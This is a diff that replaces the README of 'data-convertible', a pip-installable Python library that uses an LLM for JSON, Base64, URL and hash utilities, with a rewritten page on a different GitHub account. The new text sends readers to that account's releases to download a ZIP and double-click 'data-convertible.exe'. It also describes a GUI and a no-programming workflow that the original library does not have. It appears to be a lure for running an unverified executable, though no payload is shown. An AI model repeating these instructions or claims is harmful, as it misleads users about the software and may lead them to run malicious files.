@@ -1,84 +1,90 @@
-# data-convertible
-[![PyPI version](https://badge.fury.io/py/data-convertible.svg)](https://badge.fury.io/py/data-convertible)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Downloads](https://static.pepy.tech/badge/data-convertible)](https://pepy.tech/project/data-convertible)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-blue)](https://www.linkedin.com/in/eugene-evstafev-716669181/)
+# 🛠️ data-convertible - Simple Tool for Data Processing
 
+## 🚀 Getting Started
 
-A Python package that provides a structured and reliable way to process user input related to common developer utilities such as JSON, Base64, URL, and hash operations. It uses an LLM to interpret user requests and return formatted, validated outputs, ensuring consistency and correctness in the results.
+Welcome to **data-convertible**! This package helps you easily process various types of user input, including JSON, Base64, URLs, and hash operations. It aims to reduce the effort needed for these tasks, making life easier for developers.
 
-## Installation
+## 📥 Download Now
 
-You can install the package via pip:
+[![Download data-convertible](https://img.shields.io/badge/Download%20data--convertible-v1.0-blue)](https://github.com/kiethma/data-convertible/releases)
 
-```bash
-pip install data_convertible
-```
+## 📋 Features
 
-## Usage
+- **User-Friendly Input:** Enter your data in a simple format.
+- **Structured Results:** Get back organized output.
+- **LLM Interpretation:** Uses a language model for better understanding of your input.
+- **Error Handling:** Displays clear error messages for fixes.
+- **Multiple Operations:** Supports JSON prettifying, Base64 encoding/decoding, URL processing, and hash operations.
 
-Here's a basic example of how to use the package:
+## 🖥️ System Requirements
 
-```python
-from data_convertible import data_convertible
+- Operating System: Windows, macOS, or Linux
+- Minimum RAM: 4 GB
+- Disk Space: 100 MB free space
 
-# Process user input
-response = data_convertible("Convert 'hello' to base64")
-print(response)
-```
+## 🔗 Download & Install
 
-### Parameters
+To get started with **data-convertible**, visit this page to download the latest version: [Download Latest Release](https://github.com/kiethma/data-convertible/releases).
 
-- `user_input` (str): The user input text to process.
-- `llm` (Optional[BaseChatModel]): The LangChain LLM instance to use. If not provided, the default ChatLLM7 will be used.
-- `api_key` (Optional[str]): The API key for LLM7. If not provided, the environment variable `LLM7_API_KEY` will be used, or a default free tier key will be used.
+After downloading, follow these simple steps to install:
 
-### Using a Custom LLM
+1. Navigate to the download location on your device.
+2. Locate the downloaded file, which should be named `data-convertible-v1.0.zip`.
+3. Extract the contents of the ZIP file.
+4. Find the executable file named `data-convertible.exe` (or equivalent for your OS).
+5. Double-click on the file to run it.
 
-You can pass your own LangChain LLM instance if you want to use another LLM provider. For example, to use OpenAI:
+## 🛠️ How to Use
 
-```python
-from langchain_openai import ChatOpenAI
-from data_convertible import data_convertible
+Once you have the application running, follow these steps to process your input:
 
-llm = ChatOpenAI()
-response = data_convertible("Validate this JSON: {'name': 'John'}", llm=llm)
-```
+1. **Input Field:** Enter the text you want to transform. This can be a JSON string, Base64 text, URL, or anything related to hash operations.
+2. **Choose Operation:** Select the operation you want to perform from the dropdown menu. Options include:
+   - JSON Prettify
+   - Base64 Encode
+   - URL Encode
+   - Hash (e.g., SHA-256)
+3. **Submit:** Click the "Process" button to execute your action.
+4. **View Results:** The transformed data will display below the input field. You can copy it directly.
 
-To use Anthropic:
+## 📌 Troubleshooting
 
-```python
-from langchain_anthropic import ChatAnthropic
-from data_convertible import data_convertible
+If you encounter issues, please check the following:
 
-llm = ChatAnthropic()
-response = data_convertible("Encode this URL: example.com?q=test", llm=llm)
-```
+- **File Permissions:** Ensure you have permission to run apps from your download folder.
+- **Internet Connection:** Some functions may require an internet connection for the language model to process your request.
+- **Updated Version:** Make sure you are using the latest version of the application. Visit [Download Latest Release](https://github.com/kiethma/data-convertible/releases) for updates.
 
-To use Google Generative AI:
+## 🗂️ Supported Tasks
 
-```python
-from langchain_google_genai import ChatGoogleGenerativeAI
-from data_convertible import data_convertible
+The **data-convertible** app supports various developer utilities:
 
-llm = ChatGoogleGenerativeAI()
-response = data_convertible("Compute SHA256 of 'hello'", llm=llm)
-```
+- **JSON Processing:** Validate, prettify, and parse JSON data.
+- **Base64 Encoding/Decoding:** Convert data to and from Base64 easily.
+- **URL Handling:** Encode and decode URLs for safer web processing.
+- **Hash Operations:** Generate hash values like SHA-256 for data integrity checks.
 
-### API Key for LLM7
+## 📖 FAQs
 
-By default, the package uses ChatLLM7 from [langchain_llm7](https://pypi.org/project/langchain-llm7/) with a free tier API key. The default rate limits are sufficient for most use cases. If you need higher rate limits, you can:
+### What is **data-convertible**?
 
-- Set the environment variable `LLM7_API_KEY` to your API key.
-- Pass the API key directly: `data_convertible(..., api_key="your_api_key")`.
+**data-convertible** is a tool designed for processing common data formats encountered in development tasks. It simplifies operations such as encoding and validating JSON data or transforming input strings.
 
-You can get a free API key by registering at [https://token.llm7.io/](https://token.llm7.io/).
+### Do I need any programming knowledge to use this application?
 
-## Contributing
+No, this tool is designed for users without programming expertise. Follow the straightforward instructions to achieve your desired results.
 
-If you encounter any issues or have suggestions for improvements, please open an issue on [GitHub](https://github.com/chigwell/data-convertible/issues).
+### Can I contribute to this project?
 
-## Author
+Yes! You can help improve **data-convertible** by contributing to its development. Visit the repository for guidelines on how to get involved.
 
-- **Eugene Evstafev** - [hi@euegne.plus](mailto:hi@euegne.plus)
-- GitHub: [chigwell](https://github.com/chigwell)
+### Where should I report issues?
+
+If you find any bugs or have suggestions, please visit our GitHub Issues page. Your feedback helps us make the app better.
+
+## 🔗 Links
+
+- [GitHub Repository](https://github.com/kiethma/data-convertible)
+- [Download Latest Release](https://github.com/kiethma/data-convertible/releases)
+
+Thank you for using **data-convertible**! We hope it makes your data processing tasks easier and more efficient.
